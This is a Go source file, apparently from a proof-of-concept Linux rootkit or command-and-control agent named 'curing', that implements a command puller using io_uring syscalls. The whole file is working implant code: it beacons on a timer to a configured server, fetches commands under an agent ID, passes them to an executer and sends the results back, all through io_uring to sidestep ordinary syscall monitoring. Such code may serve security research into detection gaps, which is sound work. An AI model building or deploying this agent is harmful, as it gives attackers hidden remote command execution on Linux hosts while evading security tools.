//go:build linux

package executer

import (
	"bytes"
	"context"
	"encoding/gob"
	"fmt"
	"io"
	"log/slog"
	"net"
	"sync"
	"syscall"
	"time"

	"github.com/amitschendel/curing/pkg/common"
	"github.com/amitschendel/curing/pkg/config"
	"github.com/iceber/iouring-go"
)

type CommandPuller struct {
	executer   IExecuter
	ring       *iouring.IOURing
	cfg        *config.Config
	resultChan chan iouring.Result
	ctx        context.Context
	cancelFunc context.CancelFunc
	interval   time.Duration
	buffer     bytes.Buffer
	closeOnce  sync.Once
}

func NewCommandPuller(cfg *config.Config, ctx context.Context, executer IExecuter) (*CommandPuller, error) {
	ring, err := iouring.New(32)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(ctx)
	return &CommandPuller{
		executer:   executer,
		ring:       ring,
		cfg:        cfg,
		ctx:        ctx,
		cancelFunc: cancel,
		resultChan: make(chan iouring.Result, 32),
		interval:   time.Duration(cfg.ConnectIntervalSec) * time.Second,
	}, nil
}

// SetInterval allows configuring the connection interval
func (cp *CommandPuller) SetInterval(d time.Duration) {
	cp.interval = d
}

func (cp *CommandPuller) Run() {
	ticker := time.NewTicker(cp.interval)
	defer ticker.Stop()

	slog.Info("Starting CommandPuller")
	cp.connectReadAndProcess()

	for {
		select {
		case <-cp.ctx.Done():
			cp.Close()
			return
		case <-ticker.C:
			cp.connectReadAndProcess()
		}
	}
}

func (cp *CommandPuller) connectReadAndProcess() {
	// Connect
	fd, err := cp.connect()
	if err != nil {
		slog.Error("Error connecting to server", "error", err)
		return
	}

	defer func() {
		if err := cp.close(fd); err != nil {
			slog.Error("Error closing connection", "error", err)
		}
	}()

	// Send GetCommands request
	req := &common.Request{
		AgentID: cp.cfg.AgentID,
		Type:    common.GetCommands,
	}
	if err := cp.sendGobRequest(fd, req); err != nil {
		slog.Error("Error sending request", "error", err)
		return
	}

	// Read and decode commands with retries
	commands, err := cp.readGobCommands(fd)
	if err != nil {
		slog.Error("Error reading commands after retries", "error", err)
		return
	}

	if len(commands) > 0 {
		cp.processCommands(commands)
	}
}

func (cp *CommandPuller) sendGobRequest(fd int, req *common.Request) error {
	cp.buffer.Reset()
	encoder := gob.NewEncoder(&cp.buffer)

	if err := encoder.Encode(req); err != nil {
		return err
	}

	_, err := cp.write(fd, cp.buffer.Bytes())
	return err
}

func (cp *CommandPuller) readGobCommands(fd int) ([]common.Command, error) {
	var retries int
	maxRetries := 3
	retryDelay := 100 * time.Millisecond

	for retries < maxRetries {
		data, err := cp.readUntilEmpty(fd)
		if err != nil {
			if err == io.EOF {
				retries++
				slog.Info("Retrying command read after EOF", "retry", retries)
				time.Sleep(retryDelay)
				continue
			}
			return nil, err
		}

		decoder := gob.NewDecoder(bytes.NewReader(data))
		var commands []common.Command
		if err := decoder.Decode(&commands); err != nil {
			return nil, err
		}

		if len(commands) > 0 {
			return commands, nil
		}

		retries++
		time.Sleep(retryDelay)
	}

	return nil, fmt.Errorf("failed to read commands after %d retries", maxRetries)
}

func (cp *CommandPuller) sendResults(fd int, results []common.Result) error {
	req := &common.Request{
		AgentID: cp.cfg.AgentID,
		Type:    common.SendResults,
		Results: results,
	}
	return cp.sendGobRequest(fd, req)
}

func (cp *CommandPuller) processCommands(commands []common.Command) {
	commandChan := cp.executer.GetCommandChannel()
	outputChan := cp.executer.GetOutputChannel()

	for _, cmd := range commands {
		slog.Info("Sending command to executer", "command", cmd)
		select {
		case commandChan <- cmd:
			slog.Info("Command sent to executer", "command", cmd)
		case <-cp.ctx.Done():
			return
		}

		// Wait for result with timeout
		select {
		case result := <-outputChan:
			fd, err := cp.connect()
			if err != nil {
				slog.Error("Error connecting to send results", "error", err)
				continue
			}

			if err := cp.sendResults(fd, []common.Result{result}); err != nil {
				slog.Error("Error sending results", "error", err)
			}

			cp.close(fd)
		case <-time.After(time.Second):
			slog.Info("No immediate result for command", "command", cmd)
		case <-cp.ctx.Done():
			return
		}
	}
}

func (cp *CommandPuller) readUntilEmpty(fd int) ([]byte, error) {
	var fullData []byte
	const chunkSize = 4096

	for {
		buf := make([]byte, chunkSize)
		n, err := cp.read(fd, buf)

		if err != nil {
			if len(fullData) > 0 {
				return fullData, nil
			}
			return nil, err
		}

		if n == 0 {
			if len(fullData) > 0 {
				return fullData, nil
			}
			return nil, io.EOF
		}

		fullData = append(fullData, buf[:n]...)

		// If we received less than chunkSize, assume no more data is immediately available
		if n < chunkSize {
			break
		}
	}

	return fullData, nil
}

// connect establishes a connection to the server
func (cp *CommandPuller) connect() (int, error) {
	sockfd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return -1, err
	}

	request, err := iouring.Connect(sockfd, &syscall.SockaddrInet4{
		Port: cp.cfg.Server.Port,
		Addr: func() [4]byte {
			var addr [4]byte
			copy(addr[:], net.ParseIP(cp.cfg.Server.Host).To4())
			return addr
		}(),
	})
	if err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		syscall.Close(sockfd)
		return -1, result.Err()
	}

	slog.Info("Connected to server", "sockfd", sockfd)
	return sockfd, nil
}

func (cp *CommandPuller) read(fd int, buf []byte) (int, error) {
	request := iouring.Read(fd, buf)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return -1, err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	readBuf, _ := result.GetRequestBuffer()
	// Copy the data into the provided buffer
	copy(buf[:n], readBuf[:n])

	return n, nil
}

func (cp *CommandPuller) write(fd int, buf []byte) (int, error) {
	request := iouring.Write(fd, buf)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return -1, err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	slog.Info("Wrote to file descriptor", "fd", fd, "n", n)

	return n, nil
}

func (cp *CommandPuller) close(fd int) error {
	request := iouring.Close(fd)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return result.Err()
	}

	slog.Info("Closed file descriptor", "fd", fd)
	return nil
}

func (cp *CommandPuller) Close() {
	cp.closeOnce.Do(func() {
		slog.Info("Closing CommandPuller")
		cp.cancelFunc()

		if cp.ring != nil {
			_ = cp.ring.Close()
		}

		slog.Info("CommandPuller closed")
	})
}
